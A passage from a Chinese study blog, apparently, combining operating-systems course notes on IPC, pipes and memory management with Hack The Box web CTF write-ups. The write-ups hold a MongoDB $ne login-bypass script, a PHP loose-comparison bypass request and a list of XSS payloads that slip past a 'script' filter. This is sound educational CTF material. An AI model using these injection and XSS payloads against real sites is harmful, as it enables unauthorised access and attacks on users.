设置一个定时器，5 秒后发送 SIGALRM 信号 alarm(5); // 第一阶段：每秒打印一次计数，持续 10 秒 for (len = 0; len &lt; 10; len++) &#123; printf(&quot;Counting %d...\\n&quot;, len); sleep(1); // 每秒暂停 &#125; // 第二次定时器设置，在 10 秒后发送另一个 SIGALRM alarm(10); // 第二阶段：进入一个循环，从标准输入读取用户输入 while (1) &#123; // 从标准输入读取内容（阻塞式） len = read(0, buffer, sizeof(buffer) - 1); if (len == -1) &#123; // 读取失败，打印错误并继续 perror(&quot;read() failed&quot;); continue; &#125; if (len == 0) &#123; // 读到 EOF（比如输入 Ctrl+D），退出程序 printf(&quot;Exiting\\n&quot;); exit(0); &#125; buffer[len] = &#x27;\\0&#x27;; // 添加字符串结尾符 // 如果用户输入的是 &quot;exit&quot;，退出程序 if (!strncmp(buffer, &quot;exit&quot;, 4)) &#123; exit(0); &#125; // 把用户输入的内容原样输出回终端 write(1, buffer, strlen(buffer)); &#125; return 0;&#125; 输出示例： 12345678910111213Counting 0...Counting 1......Counting 4...Caught signal 14 &lt;-- alarm(5) 到时触发 SIGALRMCounting 5......Counting 9...hello, world &lt;-- 用户输入hello, world &lt;-- 程序回显Caught signal 14 &lt;-- alarm(10) 又触发了 SIGALRM^C Caught signal 2 &lt;-- 用户按了 Ctrl+C，触发 SIGINT (signal 2)exit &lt;-- 用户输入 exit，触发退出 宽带通道（Breitbandige Kanäle） 宽带通道（Breitbandige Kanäle）用于传输大量数据，可以根据通信的方式进一步划分为： 隐式通信（Implizite Kommunikation） 显式通信（Explizite Kommunikation） 隐式通信（Implizite Kommunikation）隐式通信（Implizite Kommunikation）是通过共享资源实现的，比如说内存、寄存器、文件、环形缓冲区等。 优点：简单快速，因为不需要不需要在不同地址空间（Adressräumen）之间复制数据。 缺点：不一定一直都有共享区域可以用；可能会出现 busy-waiting，所以需要额外的同步机制。 （第三章的内容就是在讲这个） 而隐式通信（Implizite Kommunikation） 可以进一步划分为： 同步通信（Synchrone Kommunikation） 发送方或接收方可能需要等待对方。 比如说共享内存并且设置了同步机制。 异步通信（Asynchrone Kommunikation） 发送和接收可以独立进行。 比如说通过共享的文件进行kommunizieren。 显式通信（Explizite Kommunikation）显式通信（Explizite Kommunikation）则是我们比较熟悉的：发送/接收信息。适用于地址空间（Adressräumen）分离的进程（比如两个互不相干的进程），不过是与操作系统的直接交互。 这种通信可以是本地的也可以是远程的。 一般信息由2部分组成： 消息头（Nachrichtenkopf，header）：包含管理信息，比如说发送者、接收者的标识、消息大小等。 消息体（Nachrichtenkörper）：有效载荷（payload），也就是真正的信息内容。 流程： 进程使用 send() 发送消息 操作系统的消息服务负责传递该消息 接收方进程使用 recv() 接收该消息 而显式通信（Explizite Kommunikation） 同样可以进一步划分为： 同步通信（Synchrone Kommunikation） 发送方或接收方可能需要等待对方 异步通信（Asynchrone Kommunikation） 发送和接收可以独立进行 这其中又有2种消息通信的模式（Muster）： 消息通知（Meldung） 是单向的（unidirectional），通常只是传递少量数据，比如说通知状态变化。 任务（Auftrag） 是双向的（bidirectional），比如说查询某些数据，请求发送后收到包含数据的响应。 Asynchron的优点： 在实时系统中非常有用，当发送进程不能被阻塞时； 允许发送方和接收方并行处理任务； 适合用于事件的通知/信号传递。 Asynchron的缺点： 操作系统有管理负担（需要消息缓冲区来存储异步数据） 错误处理更复杂： 无法直接通知发送方是否成功； 数据包可能丢失（当缓冲区满了，尤其是网络通信中）； 有时需要重传数据包。 在实际应用中，异步通信更常用，特别适用于不确定接收方是否在线、或者无法预测响应时间的情况。 可以使用线程来结合同步与异步通信（比如：主线程同步处理、子线程异步等待）。 Asynchrone Meldung： 只发不等 Synchrone Meldung： 等待对方确认收到 流程： 接收方在收到消息后会发送一个确认（Bestätigung） 发送方在发送完消息后会等待接收确认（Empfangsbestätigung） 确认消息不包含实际数据，仅用于同步。 另一种方法：Rendezvous-Verfahren： 在交换消息之前，发送方与接收方都要事先准备好进行发送和接收 这样一来消息不需要缓冲 Asynchrone Auftrag： 各发各的 任务（Auftrag）和结果（Resultat）是作为两个独立的消息发送的。 Synchrone Auftrag： 等待对方回复 Streams流（Stream）是对连接（Verbindung）的一种抽象。 消息在传输过程中被缓冲，所有消息被整合为逻辑上的字节流（byte stream）。 操作系统可以建立/关闭连接，或者是在流中进行读/写操作。 C++头文件中的 1#include &lt;iostream&gt; 指的就是这个。 而管道（Pipes）正是流（Stream）的实现。 管道是一个单向的流（unidirektionaler Strom）。双向通信可以用两个管道来模拟。管道实现先进先出（FIFO） 的数据传输模型。 管道（Pipes）一般分为2种： （匿名）管道 pipe() 函数会创建一个管道，它返回两个文件描述符，分别用于读和写。 可以在 fork() 创建子进程时，把其中一端交给子进程，实现进程间通信，或者在不同的线程之间使用。 命名管道（Named Pipes） 用于多个进程之间的通信，它们有自己的名字，在文件系统中可见。 代码示例： 123456789int main() &#123; int p[2]; // p[0]: 读端, p[1]: 写端 pipe(p); // 创建一个匿名管道 sendData(p[1]); // 写数据到管道 receiveData(p[0]); // 从管道中读取数据 return 0;&#125; 1234567891011void sendData(int fd) &#123; const char *msg = &quot;Hello, world&quot;; // 要发送的消息 uint16_t len = strlen(msg); // 消息长度（不含 \\0） uint16_t nLen = htons(len); // 转换为网络字节序（大端） // 先发送长度，确保接收端知道后面要读取多少字节 send(fd, &amp;nLen, sizeof(nLen), 0); // 再发送消息本体 send(fd, msg, len, 0);&#125; 123456789101112131415void receiveData(int fd) &#123; char msg[1024]; // 接收缓冲区 uint16_t nLen; // 网络字节序长度 uint16_t len; // 主机字节序长度 // 先接收长度信息（2字节） recv(fd, &amp;nLen, sizeof(nLen), 0); len = ntohs(nLen); // 转换为主机字节序 // 接收实际消息内容（len 字节） recv(fd, msg, len, 0); msg[len] = &#x27;\\0&#x27;; // 手动加上字符串结束符 printf(&quot;接收到 %u 字节：%s\\n&quot;, len, msg);&#125; 例题例题1Für wehlche der folgenden IPC-Mechanismen wird in der Regel ein Filedescriptor verwendent? Sockets Shared Memory Anon. Pipes Named Pipes Signals 答案：1，3，4。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"synchron","slug":"synchron","permalink":"https://archer-baiyi.github.io/en/tags/synchron/"},{"name":"asynchron","slug":"asynchron","permalink":"https://archer-baiyi.github.io/en/tags/asynchron/"},{"name":"signal","slug":"signal","permalink":"https://archer-baiyi.github.io/en/tags/signal/"}]},{"title":"HTB CandyVault Writeup","slug":"CTF/Web/HTB-CandyVault-Writeup","date":"2025-04-03T10:49:04.000Z","updated":"2025-04-03T10:57:36.233Z","comments":true,"path":"2025/04/03/CTF/Web/HTB-CandyVault-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/04/03/CTF/Web/HTB-CandyVault-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 查看源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from flask import Flask, Blueprint, render_template, redirect, jsonify, requestfrom flask_bcrypt import Bcryptfrom pymongo import MongoClientapp = Flask(__name__)app.config.from_object(&quot;application.config.Config&quot;)bcrypt = Bcrypt(app)client = MongoClient(app.config[&quot;MONGO_URI&quot;])db = client[app.config[&quot;DB_NAME&quot;]]users_collection = db[&quot;users&quot;]@app.errorhandler(Exception)def handle_error(error): message = error.description if hasattr(error, &quot;description&quot;) else [str(x) for x in error.args] response = &#123; &quot;error&quot;: &#123; &quot;type&quot;: error.__class__.__name__, &quot;message&quot;: message &#125; &#125; return response, error.code if hasattr(error, &quot;code&quot;) else 500@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])def login(): content_type = request.headers.get(&quot;Content-Type&quot;) if content_type == &quot;application/x-www-form-urlencoded&quot;: email = request.form.get(&quot;email&quot;) password = request.form.get(&quot;password&quot;) elif content_type == &quot;application/json&quot;: data = request.get_json() email = data.get(&quot;email&quot;) password = data.get(&quot;password&quot;) else: return jsonify(&#123;&quot;error&quot;: &quot;Unsupported Content-Type&quot;&#125;), 400 user = users_collection.find_one(&#123;&quot;email&quot;: email, &quot;password&quot;: password&#125;) if user: return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read()) else: return redirect(&quot;/&quot;) 发现使用了MongoDB进行验证： 1234user = users_collection.find_one(&#123;&quot;email&quot;: email, &quot;password&quot;: password&#125;) if user: return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read()) 如果在数据库里找到了对应的用户信息则登陆成功返回flag。 渗透利用MongoDB的漏洞进行注入。我们发送以下内容： 123456789101112131415import requestsurl = &quot;http://94.237.53.247:51317/login&quot;payload = &#123; &quot;email&quot;: &#123;&quot;$ne&quot;: None&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: None&#125;&#125;response = requests.post(url, json=payload)print(&quot;Response Body:\\n&quot;, response.text)# &lt;body&gt;# &lt;p data-text=&quot;HTB&#123;s4y_h1_t0_th3_c4andy_v4u1t!&#125;&quot;&gt;HTB&#123;s4y_h1_t0_th3_c4andy_v4u1t!&#125;&lt;/p&gt;# &lt;/body&gt; 这样一来MongoDB里的查询会被解释成： 1&#123;&quot;email&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125; 也就是说会查找 email 不为 null 且 password 不为 null 的任意用户。这样便可以绕过登录验证。 得到flag：HTB{s4y_h1_t0_th3_c4andy_v4u1t!} 。 也可以发送： 1234payload = &#123; &quot;email&quot;: &#123;&quot;$ne&quot;: 0&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: 0&#125;&#125; 是一样的。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/en/tags/%E6%B3%A8%E5%85%A5/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://archer-baiyi.github.io/en/tags/MongoDB/"}]},{"title":"HTB Juggling facts Writeup","slug":"CTF/Web/HTB-Juggling-facts-Writeup","date":"2025-04-02T22:46:14.000Z","updated":"2025-04-02T23:05:45.552Z","comments":true,"path":"2025/04/03/CTF/Web/HTB-Juggling-facts-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/04/03/CTF/Web/HTB-Juggling-facts-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 点击 secret facts： flag大概率和这个“secrets”有关系，但其他没有什么发现所以去看看源代码。在 index.php 里 123456789101112131415161718&lt;?php spl_autoload_register(function ($name) &#123; if (preg_match(&#x27;/Controller$/&#x27;, $name)) &#123; $name = &quot;controllers/$&#123;name&#125;&quot;; &#125; elseif (preg_match(&#x27;/Model$/&#x27;, $name)) &#123; $name = &quot;models/$&#123;name&#125;&quot;; &#125; include_once &quot;$&#123;name&#125;.php&quot;;&#125;);$database = new Database(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;M@k3l@R!d3s$&#x27;, &#x27;web_juggling_facts&#x27;);$database-&gt;connect();$router = new Router();$router-&gt;new(&#x27;GET&#x27;, &#x27;/&#x27;, &#x27;IndexController@index&#x27;);$router-&gt;new(&#x27;POST&#x27;,&#x27;/api/getfacts&#x27;, &#x27;IndexController@getfacts&#x27;);die($router-&gt;match()); 可以发现网页定义了2个操作：get和post。2者都调用了 IndexController ，所以我们顺着这个线索去看一下 IndexController.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass IndexController extends Controller&#123; public function __construct() &#123; parent::__construct(); &#125; public function index($router) &#123; $router-&gt;view(&#x27;index&#x27;); &#125; public function getfacts($router) &#123; $jsondata = json_decode(file_get_contents(&#x27;php://input&#x27;), true); if ( empty($jsondata) || !array_key_exists(&#x27;type&#x27;, $jsondata)) &#123; return $router-&gt;jsonify([&#x27;message&#x27; =&gt; &#x27;Insufficient parameters!&#x27;]); &#125; if ($jsondata[&#x27;type&#x27;] === &#x27;secrets&#x27; &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) &#123; return $router-&gt;jsonify([&#x27;message&#x27; =&gt; &#x27;Currently this type can be only accessed through localhost!&#x27;]); &#125; switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;secrets&#x27;) ]); case &#x27;spooky&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;spooky&#x27;) ]); case &#x27;not_spooky&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;not_spooky&#x27;) ]); default: return $router-&gt;jsonify([ &#x27;message&#x27; =&gt; &#x27;Invalid type!&#x27; ]); &#125; &#125;&#125; 稍微拆解分析一下，如果我们发送一个post请求，那么它 首先会检查请求参数是否存在： 1if ( empty($jsondata) || !array_key_exists(&#x27;type&#x27;, $jsondata) ) 判断 type 类型，如果是secrets那么检查是否是本地 IP 1if ($jsondata[&#x27;type&#x27;] === &#x27;secrets&#x27; &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) 比较type的值并进行后续操作： 12345switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: case &#x27;spooky&#x27;: case &#x27;not_spooky&#x27;:&#125; 渗透漏洞正是这个流程里的 switch() 函数。php里的这个比较函数是宽松比较（loose comparison）（严格的话是===），会根据情况自动转换类型，所以可以利用true绕过： 1234567891011121314151617181920&lt;?php$jsondata = [ &#x27;type&#x27; =&gt; true];switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: echo &quot;true == secrets\\n&quot;; break; case &#x27;spooky&#x27;: echo &quot;Failed\\n&quot;; break; case &#x27;not_spooky&#x27;: echo &quot;Failed\\n&quot;; break; default: echo &quot;Failed\\n&quot;; break;&#125; 会返回： 1true == secrets 所以我们直接发送： 123456789101112131415import requestsurl = &#x27;http://94.237.63.28:34695/api/getfacts&#x27;data = &#123; &quot;type&quot;: True&#125;resp = requests.post(url, json=data) print(&quot;Response:&quot;)print(resp.text)# 返回：# Response:# &#123;&quot;facts&quot;:[&#123;&quot;id&quot;:19,&quot;fact&quot;:&quot;HTB&#123;juggl1ng_1s_d4ng3r0u5!!!&#125;&quot;,&quot;fact_type&quot;:&quot;secrets&quot;&#125;]&#125; 就可以得到flag：HTB{juggl1ng_1s_d4ng3r0u5!!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/en/tags/PHP/"},{"name":"switch","slug":"switch","permalink":"https://archer-baiyi.github.io/en/tags/switch/"}]},{"title":"HTB SpookTastic Writeup","slug":"CTF/Web/HTB-SpookTastic-Writeup","date":"2025-04-02T21:56:21.000Z","updated":"2025-04-02T22:21:36.823Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-SpookTastic-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/04/02/CTF/Web/HTB-SpookTastic-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 翻到最底下可以看到一个输入框： 阅读一下源代码（app.py）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116import random, stringfrom flask import Flask, request, render_template, abortfrom flask_socketio import SocketIOfrom threading import Threadapp = Flask(__name__)socketio = SocketIO(app)registered_emails, socket_clients = [], &#123;&#125;generate = lambda x: &quot;&quot;.join([random.choice(string.hexdigits) for _ in range(x)])BOT_TOKEN = generate(16)def blacklist_pass(email): email = email.lower() if &quot;script&quot; in email: return False return Truedef send_flag(user_ip): for id, ip in socket_clients.items(): if ip == user_ip: socketio.emit(&quot;flag&quot;, &#123;&quot;flag&quot;: open(&quot;flag.txt&quot;).read()&#125;, room=id)def start_bot(user_ip): from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.chrome.service import Service from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC host, port = &quot;localhost&quot;, 1337 HOST = f&quot;http://&#123;host&#125;:&#123;port&#125;&quot; options = Options() options.add_argument(&quot;--headless&quot;) options.add_argument(&quot;--no-sandbox&quot;) options.add_argument(&quot;--disable-dev-shm-usage&quot;) options.add_argument(&quot;--disable-infobars&quot;) options.add_argument(&quot;--disable-background-networking&quot;) options.add_argument(&quot;--disable-default-apps&quot;) options.add_argument(&quot;--disable-extensions&quot;) options.add_argument(&quot;--disable-gpu&quot;) options.add_argument(&quot;--disable-sync&quot;) options.add_argument(&quot;--disable-translate&quot;) options.add_argument(&quot;--hide-scrollbars&quot;) options.add_argument(&quot;--metrics-recording-only&quot;) options.add_argument(&quot;--mute-audio&quot;) options.add_argument(&quot;--no-first-run&quot;) options.add_argument(&quot;--dns-prefetch-disable&quot;) options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;) options.add_argument(&quot;--media-cache-size=1&quot;) options.add_argument(&quot;--disk-cache-size=1&quot;) options.add_argument(&quot;--user-agent=HTB/1.0&quot;) service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;) browser = webdriver.Chrome(service=service, options=options) try: browser.get(f&quot;&#123;HOST&#125;/bot?token=&#123;BOT_TOKEN&#125;&quot;) WebDriverWait(browser, 3).until(EC.alert_is_present()) alert = browser.switch_to.alert alert.accept() send_flag(user_ip) except Exception as e: pass finally: registered_emails.clear() browser.quit()@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/api/register&quot;, methods=[&quot;POST&quot;])def register(): if not request.is_json or not request.json[&quot;email&quot;]: return abort(400) if not blacklist_pass(request.json[&quot;email&quot;]): return abort(401) registered_emails.append(request.json[&quot;email&quot;]) Thread(target=start_bot, args=(request.remote_addr,)).start() return &#123;&quot;success&quot;:True&#125;@app.route(&quot;/bot&quot;)def bot(): if request.args.get(&quot;token&quot;, &quot;&quot;) != BOT_TOKEN: return abort(404) return render_template(&quot;bot.html&quot;, emails=registered_emails)@socketio.on(&quot;connect&quot;)def on_connect(): socket_clients[request.sid] = request.remote_addr@socketio.on(&quot;disconnect&quot;)def on_disconnect(): del socket_clients[request.sid]if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False) 不难发现2点： 这里 1return render_template(&quot;bot.html&quot;, emails=registered_emails) 会接收我们的输入并且直接插入 bot.html 里，而查看 bot.html ： 123&#123;% for email in emails %&#125; &lt;span&gt;&#123;&#123; email|safe &#125;&#125;&lt;/span&gt;&lt;br/&gt;&#123;% endfor %&#125; 会发现它会直接将我们的输入不进行过滤直接插入进模板里，所以注入是可行的。 唯一的一点小阻拦是这里： 1234567def blacklist_pass(email): email = email.lower() if &quot;script&quot; in email: return False return True 我们输入的内容不能包含”script”。 通过这段： 12345678try: browser.get(f&quot;&#123;HOST&#125;/bot?token=&#123;BOT_TOKEN&#125;&quot;) WebDriverWait(browser, 3).until(EC.alert_is_present()) alert = browser.switch_to.alert alert.accept() send_flag(user_ip) 可以确定只要我们可以成功触发alert就可以得到flag。 渗透我们需要做的就是不构造包含”script”的注入触发alert，方法有很多种（每一行都是可行的）： 1234567891011121314151617181920212223242526272829&lt;img src=x onerror=alert(1)&gt;&lt;img src=x onerror=&amp;#x61;lert(1)&gt;&lt;img src=1 onerror=confirm(1)&gt;&lt;img src=a onerror=prompt(1)&gt;&lt;svg onload=alert(1)&gt;&lt;svg onload=&amp;#97;lert(1)&gt;&lt;svg oNlOaD=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;svg onload=/*x*/alert(1)&gt;&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;&lt;svg onload=prompt(1)&gt;&lt;svg&gt;&lt;animate attributeName=x dur=1s onend=alert(1)&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&lt;iframe onload=alert(1)&gt;&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&gt;&quot;&gt;&lt;/iframe&gt;&lt;details open ontoggle=alert(1)&gt;X&lt;/details&gt;&lt;math&gt;&lt;mtext&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/span&gt;&lt;svg onload=alert(1)&gt;&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/span&gt;&lt;iframe onload=alert(1)&gt;&lt;/span&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt; 点击后就会显示： 得到flag：HTB{al3rt5_c4n_4nd_w1l1_c4us3_jumpsc4r35!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/en/tags/JavaScript/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/en/tags/XSS/"},{"name":"html","slug":"html","permalink":"https://archer-baiyi.github.io/en/tags/html/"}]},{"title":"GBS 6 Speicherverwaltung 内存管理","slug":"TUM info 笔记/GBS/GBS-6-Speicherverwaltung-内存管理","date":"2025-04-02T20:20:04.000Z","updated":"2025-04-26T18:31:05.713Z","comments":true,"path":"2025/04/02/TUM info 笔记/GBS/GBS-6-Speicherverwaltung-内存管理/","permalink":"https://archer-baiyi.github.io/en/2025/04/02/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-6-Speicherverwaltung-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","excerpt":"操作系统基础相关笔记","text":"Einführung首先来看一下计算机存储的层次结构： 从上往下依次是寄存器、缓存、内存、硬盘以及磁带驱动器。存储空间大小（从上往下）依次递增，但读取速度依次递减。 我们这章主要关注内存（Hauptspeicher）。 物理内存管理假如所有程序可以完全访问整个物理内存，那么每个程序都有可能占用整个主内存，甚至可能覆盖掉系统内存区域，导致系统崩溃。包括程序直接也可能会相互干扰。所以我们希望给每个进程分配独立的存储空间。 寻址（Adressierung）而为了更好地管理物理地址空间（Physischer Adressraum），我们会从中抽象出逻辑地址空间（Logischer Adressraum），然后通过内存映射（Speicherabbildung，Memory Address Translation）将逻辑地址转换成实际的物理地址。这种内存映射也叫做寻址（Adressierung）。 寻址方式一般有3种： 直接寻址（Direkte Adressierung）这种寻址的映射相当于是 $f = id$ 。图示： 但一旦有多个程序运行的话，我们会碰到以下问题： 大量交换（Extensives Swapping） 在某一时刻一定是只有一个程序在运行并且使用内存空间，所以当操作系统想要切换运行的程序时，需要把当前运行程序的内存内容保存到硬盘，然后从硬盘加载下一个程序到内存中。 这样会导致效率极其低下（或者说非常慢）。 重定位（Relokation） 由于程序可以被加载到内存的不同位置，所以每次重新分配地址时需要改写（重定位）所有的地址，会非常的麻烦。（可以看下面举的例子） 基址寻址（Basis-Adressierung）每一个进程会得到一个基址（Basisadresse）$b_x$ ，这个进程的所有地址都是基于这个基址的一个相对地址。 图示： 举个例子区分一下基址寻址（Basis-Adressierung）和直接寻址（Direkte Adressierung）：假设我们现在的内存空间有15个Block，并且有2个程序在使用内存，我们将1-5分给第一个程序，把6-10分给第二个程序。如果是直接寻址的话，第一个程序的地址需要记录成（1，2，3，4，5），第二个需要记录（6，7，8，9，10）。但如果是基址寻址的话，第二个只需要记录（5；1，2，3，4，5），主要会记录相对位置。这样一来在重新分配内存空间时只需要修改basis（也就是5）即可（比如说（10；1，2，3，4，5）），其他的不需要改变。 当然基址寻址（Basis-Adressierung）也有个缺点，那就是每次计算地址时都需要进行一次加法操作。（Aufwendige Additionsoperation） 段式寻址（Segmentadressierung）将Adressraums分成不同长度的逻辑段（logische Segmente），比如说分成Stack-, Daten-, Code-Segment。这样做的好处是可以给每一段内容不同的权限（Zugriffsberechtigungen），以提高安全性，针对pwn的攻击特别有用。 每个段需要两个基本信息：段起始地址（Segmentanfangsadresse）和段的长度（Länge des Segments）。 CPU通常提供一个段寄存器（Segmentregister）来保存段信息。 只不过主要是32 位操作系统会使用段机制，而在64 位系统中基本不用段机制，最多用于线程管理（TLS）和兼容性支持。 我们来看一下x86里的段式寻址（Segmentadressierung）的例子： x86 架构会使用一个叫做全局描述符表（Global Descriptor Table, GDT）的数据结构来管理段，每一项会包含以下信息： 基地址（Basisadresse） 段的长度（Länge des Segments） 标志位（Flags）：例如Zugriff以及Segment的类型（Code，Daten还是Stack） 而段寄存器（Segmentregister）中保存的不是地址，而是GDT表中的一个索引。 1. 想要访问 cs:0x800 的话，需要先在段寄存器（Segmentregister）找到cs对应的值，也就是 0x08，然后找到这个值在DGT对应的那一行信息。随后计算 0x10000 + 0x800 = 0x10800。确认它在范围内，所以这个就是我们要的地址。 2. 想要访问 es:0x800 的话，需要先在段寄存器（Segmentregister）找到es对应的值，也就是 0x10，然后找到这个值在DGT对应的那一行信息。随后计算 0x20000 + 0x800，会发现超出范围了，因为它的长度只有 0x00800，所以会返回 “Segmentation Fault”。 空闲内存管理（Freispeicherverwaltung）存储结构位图（Bitmap）将存储空间分成相同大小的块（Blöcke），每个块用一个bit标记，1表示已占用，0表示空闲。这一串内容就是位图（Bitmap）。 例子： 但是实现过程中会遇到一个问题：Blcok的大小该怎么选择呢？选小了就会需要更大位图，但选大了又容易导致浪费。 优势： 可以简单快速地访问固定大小的内存块。 缺点： 假如有个进程需要k个Block，那么就需要在位图里找到7个连续的0，这个的开销就太大了。 链表（Verkettete Liste）还是将存储空间分成相同大小的块（Blöcke），然后链表记录块的占用信息： 链表的每一项存储： 开始地址 长度 指向下一项的指针（einen Zeiger auf den nächsten Eintrag (oder Terminator T == NULL)） 例子： P表示已被进程占用，F表空闲。 优点： 灵活（Flexible Speicheraufteilung） 缺点： 需要线性搜索（Lineare Suche） 需要挨个找有没有合适的。 没有固定的管理结构 优化的办法： 分别维护两个链表，一个存储已分配的内存块，一个存储空闲的内存块。 按照内存块大小排序 使用平衡树结构管理链表（(balancierter) Baumstruktur） 同时使用多个链表 内存分配策略（Belegungstrategien）由于需要一直分配再释放进程的存储空间，所以存储空间容易碎片化。比如说在上面那张图里有着好几个空闲的连续的存储空间，我们该如何给每个进程选择一块合适的位置呢？ 一般会用到以下几个策略： （以这个为例:） First-Fit从前往后，找到大小够的直接给。 Next-Fit从上次停止的地方开始，找到够的直接给。 Best-Fit分配“最小剩余空间”的空闲块（Freibereich mit dem geringsten Verschnitt） Worst-Fit分配“最大剩余空间”的空闲块（Freibereich mit dem größten Verschnitt） Buddy-Algorithmus将存储空间分成 $2^k$ 大小的Block，where $l \\leq k \\leq u$，$2^l$是最小的可占用的空间大小，$2^u$是最大的可占用的空间大小。当一个进程需要的存储空间为 $x$ 时，会给它分配一块大小为 $2^{\\lfloor log_2(x) \\rfloor}$ 的Block。 这样一来每次最多会浪费半个Block大小的存储空间。 分配的具体算法看这个例子就好：（需要额外注意它合并空闲块的算法） 碎片化（Fragmentierung）一般会分成内部碎片与外部碎片。 内部碎片（Interne Fragmentierung）：在按块分配内存时，通常会分配多于实际所需的内存。这部分多余的内存区域既不能被当前进程使用（内部），也不能被其他进程使用（外部）。也就是会产生很多碎片（Verschnitt）。这些多余的部分就被叫做内部碎片。 例如Buddy-Algorithmus主要带来的便是内部碎片。它给每个进程分配了一个Block之后，这个Block里多余的部分是不会分配给其他进程的。 外部碎片（Externe 